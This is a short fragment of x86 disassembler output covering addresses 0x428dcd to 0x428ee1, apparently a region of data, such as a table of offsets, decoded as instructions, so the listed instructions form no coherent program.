  428dcd:	mov    BYTE PTR [edx],al
  428dcf:	add    BYTE PTR [edx-0x78],ch
  428dd2:	add    al,BYTE PTR [eax]
  428dd4:	jl     0x428d5e
  428dd6:	add    al,BYTE PTR [eax]
  428dd8:	mov    WORD PTR [eax-0x7763fffe],cs
  428dde:	add    al,BYTE PTR [eax]
  428de0:	lods   al,BYTE PTR ds:[esi]
  428de1:	mov    BYTE PTR [edx],al
  428de3:	add    BYTE PTR [esi-0x33fffd78],bh
  428de9:	mov    BYTE PTR [edx],al
  428deb:	add    dl,bl
  428ded:	mov    BYTE PTR [edx],al
  428def:	add    dl,dh
  428df1:	mov    BYTE PTR [edx],al
  428df3:	add    BYTE PTR [ecx+ecx*4],al
  428df6:	add    al,BYTE PTR [eax]
  428df8:	push   ss
  428df9:	mov    DWORD PTR [edx],eax
  428dfb:	add    BYTE PTR [edx],ah
  428dfd:	mov    DWORD PTR [edx],eax
  428dff:	add    BYTE PTR [esi],ch
  428e01:	mov    DWORD PTR [edx],eax
  428e03:	add    BYTE PTR [edx],bh
  428e05:	mov    DWORD PTR [edx],eax
  428e07:	add    BYTE PTR [edx-0x77],cl
  428e0a:	add    al,BYTE PTR [eax]
  428e0c:	pusha  
  428e0d:	mov    DWORD PTR [edx],eax
  428e0f:	add    BYTE PTR [esi-0x77],ch
  428e12:	add    al,BYTE PTR [eax]
  428e14:	or     BYTE PTR [ecx-0x766dfffe],0x2
  428e1b:	add    BYTE PTR [eax],al
  428e1d:	add    BYTE PTR [eax],al
  428e1f:	add    BYTE PTR [ecx+ecx*4+0x2],ch
  428e26:	add    BYTE PTR [eax],al
  428e28:	retf   0x289
  428e2b:	add    ah,bl
  428e2d:	mov    DWORD PTR [edx],eax
  428e2f:	add    dh,ch
  428e31:	mov    DWORD PTR [edx],eax
  428e33:	add    BYTE PTR [edx+ecx*4],al
  428e36:	add    al,BYTE PTR [eax]
  428e38:	push   ss
  428e39:	mov    al,BYTE PTR [edx]
  428e3b:	add    BYTE PTR [eax],ch
  428e3d:	mov    al,BYTE PTR [edx]
  428e3f:	add    BYTE PTR [eax],bh
  428e41:	mov    al,BYTE PTR [edx]
  428e43:	add    BYTE PTR [esi-0x76],dl
  428e46:	add    al,BYTE PTR [eax]
  428e48:	data16 mov al,BYTE PTR [edx]
  428e4b:	add    BYTE PTR [edx+ecx*4+0x2],dh
  428e4f:	add    BYTE PTR [edx+ecx*4-0x756dfffe],al
  428e56:	add    al,BYTE PTR [eax]
  428e58:	mov    ds:0xae00028a,al
  428e5d:	mov    al,BYTE PTR [edx]
  428e5f:	add    al,al
  428e61:	mov    al,BYTE PTR [edx]
  428e63:	add    dl,dl
  428e65:	mov    al,BYTE PTR [edx]
  428e67:	add    al,ch
  428e69:	mov    al,BYTE PTR [edx]
  428e6b:	add    dh,dh
  428e6d:	mov    al,BYTE PTR [edx]
  428e6f:	add    BYTE PTR [edx],al
  428e71:	mov    eax,DWORD PTR [edx]
  428e73:	add    BYTE PTR [ebx+ecx*4],bl
  428e76:	add    al,BYTE PTR [eax]
  428e78:	xor    al,0x8b
  428e7a:	add    al,BYTE PTR [eax]
  428e7c:	dec    esp
  428e7d:	mov    eax,DWORD PTR [edx]
  428e7f:	add    BYTE PTR [edx-0x75],bl
  428e82:	add    al,BYTE PTR [eax]
  428e84:	mov    ax,WORD PTR [edx]
  428e87:	add    BYTE PTR [eax-0x75],bh
  428e8a:	add    al,BYTE PTR [eax]
  428e8c:	add    BYTE PTR [eax],al
  428e8e:	add    BYTE PTR [eax],al
  428e90:	cwde   
  428e91:	mov    eax,DWORD PTR [edx]
  428e93:	add    BYTE PTR [edx-0x4ffffd75],ah
  428e99:	mov    eax,DWORD PTR [edx]
  428e9b:	add    BYTE PTR [ebx+ecx*4-0x7433fffe],bh
  428ea2:	add    al,BYTE PTR [eax]
  428ea4:	fimul  DWORD PTR [ebx-0x7419fffe]
  428eaa:	add    al,BYTE PTR [eax]
  428eac:	lock mov eax,DWORD PTR [edx]
  428eaf:	add    BYTE PTR [edx],al
  428eb1:	mov    WORD PTR [edx],es
  428eb3:	add    BYTE PTR [eax],bl
  428eb5:	mov    WORD PTR [edx],es
  428eb7:	add    BYTE PTR [esi],ch
  428eb9:	mov    WORD PTR [edx],es
  428ebb:	add    BYTE PTR [esp+ecx*4+0x2],al
  428ebf:	add    BYTE PTR [esp+ecx*4+0x2],dl
  428ec3:	add    BYTE PTR [esp+ecx*4+0x2],ah
  428ec7:	add    BYTE PTR [esp+ecx*4+0x2],dh
  428ecb:	add    BYTE PTR [edx-0x65fffd74],al
  428ed1:	mov    WORD PTR [edx],es
  428ed3:	add    BYTE PTR [esp+ecx*4-0x734ffffe],ah
  428eda:	add    al,BYTE PTR [eax]
  428edc:	mov    esi,0x28c
  428ee1:	add    BYTE PTR [eax],al
	...
